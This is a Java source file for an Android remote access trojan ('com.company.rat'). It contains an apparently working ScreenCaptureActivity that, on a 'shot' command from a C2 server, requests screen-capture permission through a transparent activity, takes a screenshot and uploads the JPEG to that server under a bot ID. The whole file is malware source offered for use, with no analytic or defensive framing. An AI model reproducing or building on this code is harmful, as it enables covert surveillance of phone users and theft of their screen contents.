package com.company.rat;

import android.app.Activity;
import android.content.*;
import android.graphics.*;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.*;
import android.os.*;
import android.util.DisplayMetrics;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

/**
 * Transparent activity that:
 *   1. Requests MediaProjection permission (one-time user dialog)
 *   2. Captures a screenshot via VirtualDisplay
 *   3. Uploads the JPEG to C2
 *   4. Finishes immediately
 *
 * Launched by RatService when "shot" command is received.
 */
public class ScreenCaptureActivity extends Activity {

    private static final String TAG     = "ScreenCapture";
    private static final int    REQ     = 1001;

    private MediaProjectionManager mpm;
    private String botId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        botId = getIntent().getStringExtra("bot_id");
        mpm   = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        // Launch the system permission dialog
        startActivityForResult(mpm.createScreenCaptureIntent(), REQ);
    }

    @Override
    protected void onActivityResult(int req, int result, Intent data) {
        if (req != REQ || result != RESULT_OK || data == null) {
            Log.w(TAG, "permission denied or cancelled");
            finish();
            return;
        }

        MediaProjection mp = mpm.getMediaProjection(result, data);
        captureScreen(mp);
    }

    private void captureScreen(MediaProjection mp) {
        DisplayMetrics dm = getResources().getDisplayMetrics();
        int w = dm.widthPixels, h = dm.heightPixels, dpi = dm.densityDpi;

        HandlerThread ht = new HandlerThread("screenshot");
        ht.start();
        Handler handler = new Handler(ht.getLooper());

        ImageReader reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);

        VirtualDisplay vd = mp.createVirtualDisplay(
                "ScreenCapture", w, h, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                reader.getSurface(), null, handler);

        reader.setOnImageAvailableListener(r -> {
            try (Image img = r.acquireLatestImage()) {
                if (img == null) return;

                Image.Plane[] planes = img.getPlanes();
                ByteBuffer buf       = planes[0].getBuffer();
                int rowStride        = planes[0].getRowStride();
                int pixelStride      = planes[0].getPixelStride();
                int rowPadding       = rowStride - pixelStride * w;

                Bitmap bmp = Bitmap.createBitmap(w + rowPadding / pixelStride, h, Bitmap.Config.ARGB_8888);
                bmp.copyPixelsFromBuffer(buf);
                Bitmap cropped = Bitmap.createBitmap(bmp, 0, 0, w, h);
                bmp.recycle();

                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                cropped.compress(Bitmap.CompressFormat.JPEG, 80, baos);
                cropped.recycle();
                byte[] jpeg = baos.toByteArray();

                // Upload in background
                new Thread(() -> {
                    C2Client c2 = C2Client.fromAssets(ScreenCaptureActivity.this);
                    String name = "shot_" + System.currentTimeMillis() + ".jpg";
                    c2.uploadFile(botId != null ? botId : "unknown", jpeg, name, "image/jpeg");
                    c2.sendResult(botId != null ? botId : "unknown",
                            "shot: uploaded " + name + " (" + jpeg.length + " bytes)");
                }).start();

            } catch (Exception e) {
                Log.e(TAG, "screenshot error", e);
            } finally {
                vd.release();
                mp.stop();
                ht.quitSafely();
                reader.close();
                finish();
            }
        }, handler);
    }
}
